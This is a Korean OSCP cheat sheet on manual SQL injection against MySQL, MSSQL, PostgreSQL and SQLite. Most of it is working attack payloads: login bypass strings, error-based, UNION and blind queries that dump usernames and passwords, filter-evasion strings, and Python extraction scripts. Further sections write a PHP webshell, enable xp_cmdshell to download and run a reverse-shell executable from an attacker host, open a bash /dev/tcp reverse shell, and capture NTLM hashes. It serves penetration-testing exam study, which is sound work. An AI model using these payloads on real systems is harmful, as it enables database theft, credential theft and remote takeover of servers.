---
title: "SQL 인젝션 (SQL Injection)"
date: 2026-06-20
weight: 40
draft: false
tags: ["oscp", "cheatsheet"]
summary: "SQLmap 없이 수동으로 진행하는 SQL 인젝션 절차와 자주 쓰는 페이로드."
---

OSCP 시험에서는 SQLmap 사용이 금지되어 있으므로 모든 SQL 인젝션을 수동으로 수행한다.

- 출처: https://heretek.dev/oscp-cheatsheet/sql-injection/ (Jean Romero) — 재구성
- 변수: `$TARGET` = 공격 대상, `$ATTACKER` = 공격자(Kali) IP (본문의 `ATTACKER_IP`도 같은 의미)

## 동작 원리

앱은 사용자 입력을 SQL 쿼리에 그대로 붙여 넣는다. 로그인 폼에 `offsec`을 입력하면:

```sql
SELECT username,password FROM users WHERE username='offsec' AND password='hashed_pass';
```

`offsec'`처럼 따옴표를 하나 더 넣으면 쿼리가 깨지고 DB 에러가 발생한다. 쿼리를 제어할 수 있다는 뜻이다.

`offsec' or 1=1;-- -`를 입력하면 쿼리가 이렇게 바뀐다:

```sql
SELECT username,password FROM users WHERE username='offsec' or 1=1;-- -' AND password='hashed_pass';
```

`or 1=1`은 항상 참이고 `-- -`가 나머지를 주석 처리한다.

## 1단계 — 인젝션 지점 찾기

wfuzz로 폼 필드에 알려진 SQLi 페이로드와 특수문자를 넣어 본다:

```bash
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php
wfuzz -c -z file,/usr/share/seclists/Fuzzing/special-chars.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php
wfuzz -c -z file,/usr/share/seclists/Fuzzing/SQLi/quick-SQLi.txt -d "username=FUZZ&password=bar" -u http://TARGET/login.php -p "127.0.0.1:8080:HTTP"
```

Burp Repeater에서 수동 테스트:

```text
'
"
;
' or 1=1-- -
' or 1=1;-- -
```

응답에서 볼 것:

- DB 에러 메시지 → 에러 기반 SQLi
- 로그인 성공 또는 페이지 내용 변화 → in-band SQLi (UNION 시도)
- 변화 없음 → blind SQLi 테스트

## 2단계 — DBMS 식별

에러 메시지로 판별한다:

- `You have an error in your SQL syntax` → MySQL
- `Unclosed quotation mark... Microsoft SQL Server` → MSSQL
- `ERROR: syntax error at or near` → PostgreSQL

주석 문법:

- MySQL: `-- -` 또는 `#` — 예: `' or 1=1-- -`
- MSSQL: `--` — 예: `' or 1=1--`
- PostgreSQL: `--` — 예: `' or 1=1--`

- MySQL은 `--` 뒤에 공백이 필요하다. `-- -`를 쓰면 확실하다. MSSQL/PostgreSQL은 `-`를 하나 더 붙일 필요가 없다.
- URL 인코딩된 POST 데이터에서는 공백이 `+`가 된다. Burp에서는 `-- -`가 `--+-`로 쓰인다.

## 3단계 — 공격 방식 선택

- 에러 기반: 에러 메시지가 페이지에 표시될 때 — 빠름
- UNION 기반: 앱이 쿼리 결과를 페이지에 표시할 때 — 빠름
- Stacked queries: `;`로 두 번째 구문 실행 (WAITFOR/SLEEP으로 확인) — MSSQL에서는 즉시 RCE로 연결 (빈출)
- Boolean blind: 페이지는 변하지만 에러·데이터가 안 보일 때 — 느림
- Time-based blind: 눈에 보이는 변화가 전혀 없을 때 — 가장 느림

- MSSQL(IIS + ASP.NET + SqlClient)이면 stacked queries를 먼저 확인한다: `'; WAITFOR DELAY '0:0:5'--`. 동작하면 나머지는 건너뛰고 바로 xp_cmdshell로 간다.

공격 방식을 하나 정해 파고들기 전에 아래의 탐지 체크리스트를 전부 돌린다. 5분, 7개 테스트로 무엇이 통하는지 정확히 보인다.

## SQLi 탐지 체크리스트 (공격 확정 전 7개 테스트 전부 실행)

### 테스트 1 — 인젝션이 존재하는가

필드에 `'`를 넣는다. 앱이 깨지거나 에러를 보이거나 다르게 동작하는가?

- 성공 → 인젝션 가능. 계속 진행.
- 실패 → `"`, `\`, `1 OR 1=1`, `)` 시도. 아무것도 안 깨지면 인젝션 불가일 확률이 높다.

### 테스트 2 — 인증 우회

로그인이 되는가? 되면 끝.

### 테스트 3 — 에러 기반 (테스트 1의 응답 확인)

`'` 테스트에서 페이지에 DB 에러 메시지가 보였는가? 보이면:

```text
MySQL:  ' OR 1=1 IN (SELECT version())-- -
MSSQL:  ' AND 1=cast((SELECT DB_NAME()) AS int)--
Postgres: ' AND 1=cast((SELECT version()) AS int)--
```

에러 메시지에 버전이나 DB 이름이 담겨 나오면 에러 기반이 동작하는 것이다. 그것을 사용한다.

### 테스트 4 — UNION 기반

```sql
' ORDER BY 1-- -
' ORDER BY 5-- -
' ORDER BY 10-- -
```

컬럼 수를 찾고 placeholder로 UNION SELECT를 시도한다. ORDER BY는 되는데 UNION이 계속 실패하면 여기서 멈추고 테스트 5로 넘어간다.

### 테스트 5 — Stacked queries (중요 — 특히 MSSQL)

```text
MSSQL:  '; WAITFOR DELAY '0:0:5'--
MySQL:  '; SELECT SLEEP(5)-- -       (PHP 앱에서는 대개 실패)
Postgres: '; SELECT pg_sleep(5)--
```

응답이 5초 늦어졌는가? stacked queries가 동작하는 것이다. MSSQL이면 데이터 추출을 건너뛰고 바로 xp_cmdshell로 간다.

### 테스트 6 — Boolean blind

```text
' AND 1=1-- -     → page looks normal?
' AND 1=2-- -     → page looks different?
```

두 페이지가 다르게 보이면 boolean blind가 동작한다. Python으로 스크립트화한다.

### 테스트 7 — Time-based blind (최후 수단)

```text
MySQL:  ' AND IF(1=1,SLEEP(5),0)-- -
MSSQL:  '; IF(1=1) WAITFOR DELAY '0:0:5'--     (this IS stacked queries — same as Test 5)
Postgres: ' AND (SELECT CASE WHEN 1=1 THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

- MSSQL은 WAITFOR DELAY에 stacked queries가 필요하다. 테스트 5가 성공했으면 xp_cmdshell로 건너뛴다.

요약:

- Auth bypass — 그냥 로그인되는지 — 즉시
- Error-based — 에러 메시지로 데이터 반환 — 빠름
- UNION — 페이지 본문으로 데이터 반환 — 빠름
- Stacked queries — 별도 구문 실행 가능 (MSSQL은 RCE) — 즉시 RCE
- Boolean blind — 페이지 변화 = true/false — 느림 (스크립트화)
- Time-based blind — 응답 지연 = true/false — 가장 느림 (스크립트화)

## 인증 우회

username 필드에 넣는다:

```sql
offsec' or 1=1;-- -
admin' or 1=1;-- -
' or 1=1;-- -
' or 1=1-- -
' or 1=1#
admin'-- -
') or ('1'='1'-- -
" or 1=1-- -
```

동작 원리:

```sql
SELECT * FROM users WHERE username='offsec' or 1=1;-- -' AND password='...'
--                                          ^^^^^^^^     ^^^^^^^^^^^^^^^^^^
--                                          always true  commented out
```

## 에러 기반 SQLi

```sql
' or 1=1 in (SELECT version())-- -
' or 1=1 in (SELECT database())-- -
' or 1=1 in (SELECT schema_name FROM information_schema.schemata LIMIT 0,1)-- -
' or 1=1 in (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)-- -
' or 1=1 in (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)-- -
' or 1=1 in (SELECT group_concat(username,';',password SEPARATOR '\n\n') FROM users)-- -
```

### MySQL — extractvalue()

```sql
' AND extractvalue(1, concat(0x3a, database()))-- -
' AND extractvalue(1, concat(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))-- -
' AND extractvalue(1, concat(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))-- -
' AND extractvalue(1, concat(0x3a, (SELECT concat(username,';',password) FROM users LIMIT 0,1)))-- -
```

`0x3a`는 `:`. `LIMIT 0,1`은 첫 행, `LIMIT 1,1`은 두 번째 행.

- extractvalue()는 약 32자에서 잘린다. 긴 데이터는 `SUBSTRING()`으로 나눠 읽는다:

```sql
' AND extractvalue(1, concat(0x3a, SUBSTRING((SELECT password FROM users LIMIT 0,1), 1, 30)))-- -
' AND extractvalue(1, concat(0x3a, SUBSTRING((SELECT password FROM users LIMIT 0,1), 31, 30)))-- -
```

### MySQL — updatexml() (extractvalue가 막혔을 때)

```sql
' AND updatexml(1, concat(0x3a, (SELECT version())), 1)-- -
' AND updatexml(1, concat(0x3a, (SELECT concat(username,';',password) FROM users LIMIT 0,1)), 1)-- -
```

### MSSQL — cast() / convert()

```sql
' AND 1=cast((SELECT @@version) AS int)--
' AND 1=cast((SELECT DB_NAME()) AS int)--
' AND 1=cast((SELECT TOP 1 name FROM sysdatabases) AS int)--
' AND 1=cast((SELECT TOP 1 name FROM sysobjects WHERE xtype='U') AS int)--
' AND 1=cast((SELECT TOP 1 username FROM users) AS int)--
' AND 1=cast((SELECT TOP 1 password FROM users) AS int)--
```

MSSQL 다음 행 — LIMIT이 없으므로 `NOT IN` 사용:

```sql
' AND 1=cast((SELECT TOP 1 name FROM sysobjects WHERE xtype='U' AND name NOT IN ('users')) AS int)--
' AND 1=cast((SELECT TOP 1 username FROM users WHERE username NOT IN ('admin')) AS int)--
```

### PostgreSQL — cast()

```sql
' AND 1=cast((SELECT version()) AS int)--
' AND 1=cast((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1) AS int)--
' AND 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1) AS int)--
' AND 1=cast((SELECT username FROM users LIMIT 1) AS int)--
```

다음 행은 `OFFSET 1`, `OFFSET 2` 식으로 추가한다.

## UNION 기반 SQLi

### 1단계 — 컬럼 수 찾기

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 6-- -          (ERROR → only 5 columns)
```

Burp에서는 `'+ORDER+BY+1--+-`.

### 2단계 — 화면에 보이는 컬럼 찾기

```sql
' UNION SELECT 'A1','B2','C3','D4','D5'-- -
```

Burp에서는 `'+union+select+'A1','B2','C3','D4','D5'--+-`.

타입 에러가 나면 NULL을 사용한다: `' UNION SELECT NULL,'B2',NULL,NULL,NULL-- -`

### 3단계 — 데이터 추출

MySQL:

```text
'+union+select+'A1',database(),'C3','D4','D5'--+-
'+union+select+'A1',table_name,'C3','D4','D5'+from+information_schema.tables+where+table_schema=database()--+-
'+union+select+'A1',column_name,'C3','D4','D5'+from+information_schema.columns+where+table_name='users'--+-
'+union+select+'A1',group_concat(username,'@@',password),'C3','D4','D5'+from+users--+-
```

group_concat이 잘리면 한 행씩:

```text
'+union+select+'A1',concat(username,'@@',password),'C3','D4','D5'+from+users+LIMIT+0,1--+-
'+union+select+'A1',concat(username,'@@',password),'C3','D4','D5'+from+users+LIMIT+1,1--+-
```

MSSQL:

```sql
' UNION SELECT NULL,@@version,NULL,NULL,NULL--
' UNION SELECT NULL,DB_NAME(),NULL,NULL,NULL--
' UNION SELECT NULL,name,NULL,NULL,NULL FROM master..sysdatabases--
' UNION SELECT NULL,name,NULL,NULL,NULL FROM sysobjects WHERE xtype='U'--
' UNION SELECT NULL,name,NULL,NULL,NULL FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')--
' UNION SELECT NULL,username+':'+password,NULL,NULL,NULL FROM users--
```

한 행씩 (MSSQL에는 LIMIT이 없다):

```sql
' UNION SELECT TOP 1 NULL,username,NULL,NULL,NULL FROM users--
' UNION SELECT TOP 1 NULL,username,NULL,NULL,NULL FROM users WHERE username NOT IN ('admin')--
```

PostgreSQL:

```sql
' UNION SELECT NULL,table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public'--
' UNION SELECT NULL,column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,username||':'||password,NULL,NULL FROM users--
```

SQLite:

```sql
' UNION SELECT NULL,group_concat(tbl_name),NULL FROM sqlite_master WHERE type='table'--
' UNION SELECT NULL,sql,NULL FROM sqlite_master WHERE tbl_name='users'--
' UNION SELECT NULL,group_concat(username||':'||password,char(10)),NULL FROM users--
```

## information_schema 치트시트

MySQL과 PostgreSQL:

- 모든 DB: `SELECT schema_name FROM information_schema.schemata`
- 현재 DB의 테이블: `SELECT table_name FROM information_schema.tables WHERE table_schema=database()`
- 테이블의 컬럼: `SELECT column_name FROM information_schema.columns WHERE table_name='users'`
- 데이터 덤프: `SELECT group_concat(user,';',passwd SEPARATOR '\n\n') FROM users`

MSSQL (시스템 테이블이 다르다):

- 모든 DB: `SELECT name FROM master..sysdatabases`
- 테이블: `SELECT name FROM sysobjects WHERE xtype='U'`
- 컬럼: `SELECT name FROM syscolumns WHERE id=(SELECT id FROM sysobjects WHERE name='users')`

## SQLi → 파일 읽기 / 웹셸 (MySQL)

파일 읽기:

```sql
' UNION SELECT NULL,LOAD_FILE('/etc/passwd'),NULL,NULL,NULL-- -
' UNION SELECT NULL,LOAD_FILE('C:/xampp/htdocs/wp-config.php'),NULL,NULL,NULL-- -
```

웹셸 쓰기:

```sql
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT NULL,'<?php system($_GET["cmd"]); ?>',NULL,NULL,NULL INTO OUTFILE 'C:/xampp/htdocs/shell.php'-- -
```

실행: `http://TARGET/shell.php?cmd=whoami`

- 실패 조건: 파일이 이미 존재하거나, FILE 권한이 없거나, `secure_file_priv`가 경로를 제한할 때.

## Stacked Queries — MSSQL RCE (xp_cmdshell)

MSSQL은 `;`로 여러 구문을 실행할 수 있다. MySQL은 대부분의 PHP 앱에서 불가능하다.

탐지: `'; WAITFOR DELAY '0:0:5'--` → 5초 지연이면 stacked queries가 동작한다.

1단계 — xp_cmdshell 활성화:

```sql
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;--
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
```

2단계 — 명령 실행 (출력은 안 보인다):

```sql
'; EXEC xp_cmdshell 'whoami';--
```

ping으로 확인: `'; EXEC xp_cmdshell 'ping ATTACKER_IP';--`
리스너: `sudo tcpdump -i tun0 icmp`

3단계 — 리버스 셸:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER LPORT=443 -f exe -o shell.exe
python3 -m http.server 80
```

```sql
'; EXEC xp_cmdshell 'certutil -urlcache -f http://ATTACKER/shell.exe C:\Windows\Temp\shell.exe';--
'; EXEC xp_cmdshell 'C:\Windows\Temp\shell.exe';--
```

xp_cmdshell이 거부되면 — 해시 탈취:

```sql
'; EXEC master..xp_dirtree '\\ATTACKER_IP\share\';--
```

잡기: `sudo responder -I tun0 -A` → 크랙은 `hashcat -m 5600`

Burp용 URL 인코딩:

```text
';+EXEC+sp_configure+'show+advanced+options',1;+RECONFIGURE;--
';+EXEC+sp_configure+'xp_cmdshell',1;+RECONFIGURE;--
';+EXEC+xp_cmdshell+'whoami';--
';+EXEC+xp_cmdshell+'ping+ATTACKER_IP';--
```

## Stacked Queries — PostgreSQL RCE

```sql
'; COPY (SELECT '') TO PROGRAM 'whoami';--
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"';--
```

`superuser` 역할이 필요하다. psql에서 `\du`로 확인한다.

## Blind SQLi — Boolean 기반

확인: `offsec' or 1=1-- -` vs `offsec' or 1=2-- -` → 페이지가 서로 다른가?

한 글자씩 추출:

```text
offsec' AND substring(database(),1,1)='a'-- -     → FALSE
offsec' AND substring(database(),1,1)='o'-- -     → TRUE
offsec' AND substring(database(),2,1)='f'-- -     → TRUE
offsec' AND (SELECT substring(password,1,1) FROM users LIMIT 1)='a'-- -
```

## Blind SQLi — Time 기반

```sql
-- MySQL
offsec' AND IF(1=1,SLEEP(2),0)-- -
offsec' AND IF(substring(database(),1,1)='o',SLEEP(2),0)-- -

-- MSSQL
offsec'; IF(1=1) WAITFOR DELAY '0:0:5'--
offsec'; IF(SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- PostgreSQL
offsec'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
```

## Blind SQLi — Python 스크립트 (SQLmap은 금지)

Boolean 기반 추출기:

```text
#!/usr/bin/env python3
import requests, string

url = "http://TARGET/login.php"
true_indicator = "Welcome"
charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+.,;:"
extracted = ""

for pos in range(1, 50):
    found = False
    for char in charset:
        payload = f"offsec' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))={ord(char)}-- -"
        data = {"username": payload, "password": "anything"}
        r = requests.post(url, data=data)
        if true_indicator in r.text:
            extracted += char
            print(f"[+] {pos}: {char}  =>  {extracted}")
            found = True
            break
    if not found:
        print(f"[*] Done: {extracted}")
        break
```

Time 기반 추출기:

```text
#!/usr/bin/env python3
import requests, string

url = "http://TARGET/login.php"
charset = string.ascii_letters + string.digits + "!@#$%^&*()-_=+.,;:"
extracted = ""

for pos in range(1, 50):
    found = False
    for char in charset:
        payload = f"offsec' AND IF(ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),{pos},1))={ord(char)},SLEEP(3),0)-- -"
        data = {"username": payload, "password": "anything"}
        try:
            r = requests.post(url, data=data, timeout=8)
            if r.elapsed.total_seconds() >= 2.5:
                extracted += char
                print(f"[+] {pos}: {char}  =>  {extracted}")
                found = True
                break
        except requests.exceptions.Timeout:
            extracted += char
            print(f"[+] {pos}: {char}  =>  {extracted}")
            found = True
            break
    if not found:
        print(f"[*] Done: {extracted}")
        break
```

DB별 time 페이로드:

- MySQL: `IF(condition,SLEEP(3),0)`
- MSSQL: `IF(condition) WAITFOR DELAY '0:0:3'`
- PostgreSQL: `CASE WHEN condition THEN pg_sleep(3) ELSE pg_sleep(0) END`

## 필터 / WAF 우회

```text
-- Space blocked? Use comments
'+union+select+/**/NULL,version(),NULL--+-

-- UNION blocked? Case variation
'+uNiOn+sElEcT+'A1',database(),'C3'--+-

-- Quotes blocked? Use hex
... WHERE table_name=0x7573657273              (hex for 'users')

-- AND/OR blocked?
' && 1=1-- -
' || 1=1-- -

-- Double URL encoding (if WAF decodes once)
%2527+or+1%253d1--+-
```

## 빠른 참조 링크 (같은 폴더 문서)

- 전체 흐름 → [methodology.md](methodology.md)
- 웹 공격 (디렉터리 브루트포싱·CMS·LFI·업로드 등) → [web-attacks.md](web-attacks.md)
